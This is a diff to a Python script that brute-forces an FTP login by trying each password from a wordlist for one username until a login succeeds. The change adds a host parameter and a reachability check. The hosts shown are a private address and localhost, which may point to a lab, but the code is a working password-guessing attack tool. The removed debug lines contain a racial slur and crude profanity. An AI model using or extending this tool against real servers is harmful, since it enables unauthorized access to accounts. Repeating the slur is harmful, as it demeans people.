@@ -2,20 +2,35 @@ from ftplib import FTP
 import ftplib
 import time
 
-def check_cred(user,password):
-    #domain name or server ip:
-    ftp = FTP('10.12.136.249')
+ftp = None
+
+def check_cred(host,user,password):
+    global ftp
+    if ftp is None:
+        ftp = FTP(host)
     #ftp = FTP('192.168.43.114')
     try:
-        print("trying",password,"...")
         ftp.login(user=user, passwd =password)
-        print("We in mah niggas.")
         return 1
     except TimeoutError:
-        print("Bitch too much time")
+        return None
     except ftplib.error_perm:
-        print("WTF this shit ain't right")
-    return 0
+        return 0
+    except Exception:
+        return None
+    return None
+
+def check_ftp(host):
+    try:
+        ftp = FTP(host)
+        ftp.close()
+    except TimeoutError:
+        return 0
+    except ftplib.error_perm:
+        return 0
+    except Exception:
+        return 0
+    return 1
 
 def main():
     start = time.time()
@@ -23,7 +38,7 @@ def main():
         line = fp.readline().strip()
         cnt = 1
         while line:
-            ret = check_cred('crypto',line)
+            ret = check_cred('127.0.0.1','crypto',line)
             if(ret==1):
                 break
             line = fp.readline().strip()
